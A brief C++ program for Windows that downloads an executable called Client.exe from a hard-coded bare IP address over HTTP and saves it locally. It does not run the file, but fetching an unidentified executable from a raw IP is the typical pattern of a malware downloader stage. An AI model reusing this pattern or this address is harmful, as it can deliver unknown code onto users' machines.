#include <windows.h>
#include <urlmon.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")

int main() {
    const char* url = "http://172.188.16.91/Client.exe";
    const char* output = "Client.exe";
    
    HRESULT hr = URLDownloadToFileA(NULL, url, output, 0, NULL);
    
    if (SUCCEEDED(hr)) {
        std::cout << "Download successful: " << output << "\n";
    } else {
        std::cerr << "Download failed with error code: " << hr << "\n";
    }
    
    return 0;
}